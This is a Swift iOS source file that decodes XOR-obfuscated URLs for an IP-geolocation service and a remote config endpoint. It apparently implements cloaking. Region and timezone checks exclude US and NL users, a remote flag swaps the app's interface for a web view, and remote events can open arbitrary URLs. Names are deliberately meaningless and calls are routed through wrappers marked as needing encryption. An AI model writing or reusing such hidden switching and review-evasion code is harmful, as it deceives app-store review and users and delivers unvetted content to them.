
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func sireune(_ input: String) -> String? {
    let k: UInt8 = 91
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kInaoeuysh = "My8vKyhhdHQ6KzJ1NiJ2Mit1MjR0LWl0Mit1MSg0NQ=="         //Ip ur

//https://mock.apipost.net/mock/61c39c02c459000/?apipost_id=1c3a1103751002
// err      My8vKyhhdHQ2NDgwdTY+NTwjLj48LnU4NDZ0NjQ4MHRtYj5oaWI6PjhoaGNrYm84PWNoamJjY2N0Fj42NCkiFjQtPnQW
// right    My8vKyhhdHQ2NDgwdTorMis0KC91NT4vdDY0ODB0bWo4aGI4a2k4b25ia2trdGQ6KzIrNCgvBDI/Zmo4aDpqamtobG5qa2tp
internal let kTrasr = "My8vKyhhdHQ2NDgwdTorMis0KC91NT4vdDY0ODB0bWo4aGI4a2k4b25ia2trdGQ6KzIrNCgvBDI/Zmo4aDpqamtobG5qa2tp"

// https://raw.githubusercontent.com/jduja/stamen/main/striong.jpg
// My8vKyhhdHQpOix1PDIvMy45Lig+KTg0NS8+NS91ODQ2dDE/LjE6dCgvOjY+NXQ2OjI1dCgvKTI0NTx1MSs8
internal let kOianeysb = "My8vKyhhdHQpOix1PDIvMy45Lig+KTg0NS8+NS91ODQ2dDE/LjE6dCgvOjY+NXQ2OjI1dCgvKTI0NTx1MSs8"

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func jaiuens() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UITabBarController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 60 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func kiemoane() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: jaiuens
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func yduane(_ dt: Hseshen) {
    DispatchQueue.main.async {
        
        UserDefaults.standard.setModel(dt, forKey: "Hseshen")
        UserDefaults.standard.synchronize()
        
        let vc = AieunVcgyViewC()
        vc.msjeiws = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func peimnake(_ param: Hseshen) {
    let fName = ""

    typealias rushBlitzIusj = (Hseshen) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : yduane
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func rtiaenw(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
//        ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : amt as Any, AFEventParamCurrency: cuy as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func Ewuinass(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : rtiaenw
    ]
    
    fctn[fName]?(param)
}


//internal func Oismakels(_ param: [String : String], _ param2: [String : String]) {
//    let fName = ""
//    typealias maxoPams = ([String : String], [String : String]) -> Void
//    let fctn: [String: maxoPams] = [
//        fName : ZuwoAsuehna
//    ]
//    
//    fctn[fName]?(param, param2)
//}


internal struct Yuaneid: Codable {

    let country: Kiaoewm?
    
    struct Kiaoewm: Codable {
        let code: String
    }
}

internal struct Hseshen: Codable {
    
    let dieny: String?         //key arr
    let mdjaoe: [String]?            // yeu nan xianzhi
    let jjoauen: String?         // shi fou kaiqi
    let msjooi: String?         // jum
    let hhbaie: String?          // backcolor
    let msokenb: String?
    let woajen: String?   //ad key
    let auybse: String?   // app id
    let manjsuq: String?  // bri co
}

//internal func JaunLowei() {
//    if isTm() {
//        if UserDefaults.standard.object(forKey: "same") != nil {
//            WicoiemHusiwe()
//        } else {
//            if GirhjyKaom() {
//                LznieuBysuew()
//            } else {
//                WicoiemHusiwe()
//            }
//        }
//    } else {
//        WicoiemHusiwe()
//    }
//}

// MARK: - 加密调用全局函数HandySounetHmeSh
//internal func Kapiney() {
//    let fName = ""
//    
//    let fctn: [String: () -> Void] = [
//        fName: JaunLowei
//    ]
//    
//    fctn[fName]?()
//}


//func isTm() -> Bool {
//   
//  // 2026-04-08 03:21:43
//  //1775593303
//  let ftTM = 1775593303
//  let ct = Date().timeIntervalSince1970
//  if ftTM - Int(ct) > 0 {
//    return false
//  }
//  return true
//}

//func iPLIn() -> Bool {
//    // 获取用户设置的首选语言（列表第一个）
//    guard let cysh = Locale.preferredLanguages.first else {
//        return false
//    }
//    // 印尼语代码：id 或 in（兼容旧版本）
//    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
//}


//private let cdo = ["US","NL"]
private let cdo = [sireune("Dgg="), sireune("FRc=")]

// 时区控制
func Moauehnha() -> Bool {
    
    if let rc = Locale.current.regionCode {
//        print(rc)
        if cdo.contains(rc) {
            return false
        }
    }

    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
        return false
    }
    
    return true
}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}


